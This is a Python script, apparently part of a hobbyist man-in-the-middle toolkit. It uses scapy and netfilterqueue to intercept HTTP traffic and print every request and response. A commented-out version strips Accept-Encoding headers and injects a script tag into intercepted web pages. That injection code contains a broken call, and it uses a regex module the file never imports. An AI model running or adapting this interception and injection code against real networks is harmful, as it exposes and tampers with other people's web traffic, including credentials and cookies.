import scapy.all as scapy
import traceback # Import the traceback module for detailed errors
import netfilterqueue

def process_packet(packet):
    """
    DEBUGGING VERSION: This function just prints the contents of HTTP packets
    and does not modify them.
    """
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw):
            load = scapy_packet[scapy.Raw].load

            # Check for outgoing HTTP requests
            if scapy_packet[scapy.TCP].dport == 80:
                print("\n\n=============== HTTP REQUEST INTERCEPTED ===============\n")
                # Try to decode and print the raw request headers and body
                print(load.decode('latin-1', errors='ignore'))
                print("\n========================================================\n\n")

            # Check for incoming HTTP responses
            elif scapy_packet[scapy.TCP].sport == 80:
                print("\n\n=============== HTTP RESPONSE INTERCEPTED ===============\n")
                # Try to decode and print the raw response headers and body
                print(load.decode('latin-1', errors='ignore'))
                print("\n=========================================================\n\n")

    except Exception:
        # This will catch any errors during scapy parsing
        print("[!!!] Packet parsing failed. [!!!]")
        traceback.print_exc()
    
    # Always accept the packet to keep the connection alive
    packet.accept()

"""
INJECTION_SCRIPT = b"<script>alert('MitM by Syn-apse!')</script>" 
def process_packet(packet): 

            
    print(f"[HTTP] Packet recieved by queue")

    try: 
        scapy_packet = scapy.IP(packet.get_payload()) 

        print (f"[HTTP] Packet parsed by scapy: {scapy_packet.summary()}")

        print()
        
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP): 
            
            load = scapy_packet[scapy.Raw].load 
            modified = False 

            if scapy_packet[scapy.TCP].dport == 80: 

                # This is a request going TO the web server 
                print("[HTTP] Intercepted HTTP Request") 
                # Decode the raw load to string to manipulate headers 
                load_str = load.decode('latin-1', errors='ignore') 
                # Use regex to remove the Accept-Encoding header, making the server send plain text 
                modified_load_str = re.sub(r"Accept-Encoding:.*?\\r\\n", "", load_str, flags=re.IGNORECASE) 
                modified_load = modified_load_str.encode('latin-1') 
                
                if modified_load != load: 
                    print("[HTTP] Stripped Accept-Encoding header from request.") 
                    scapy_packet[scapy.Raw].load = modified_load 
                    modified = True 
                    
            # Process Incoming HTTP Responses 
            elif scapy_packet[scapy.TCP].sport == 80: 

                # This is a response coming FROM the web server 
                print("[HTTP] Intercepted HTTP Response") 
                
                # Check if the payload contains HTML and inject the script 
                # Ccheck for </body> in bytes, as the body can be large 
                if b"</body>" in load: 
                    print("[HTTP] HTML Body found. Injecting script...") 
                    modified_load = load.replace(b"</body>", INJECTION_SCRIPT + b"</body>") 
                    scapy_packet[scapy.Raw].load = modified_load 
                    modified = True # If packet has been modified, recalculate checksums 
                    
            if modified: 
                del scapy_packet[scapy.IP].len 
                del scapy_packet[scapy.IP].chksum 
                del scapy_packet[scapy.TCP].chksum 
                _payload(bytes(scapy_packet)) 
            
    except Exception: 
        
        print("[HTTP] CRITICAL ERROR IN process_packet [!!!]") 
        traceback.print_exc() 
    

    # Forward the packet (original or modified) 
    packet.accept()
"""


def start():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    print("[HTTP] Packet modifier started. Waiting for traffic...")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\n[HTTP] Shutting down packet modifier.")
        queue.unbind()

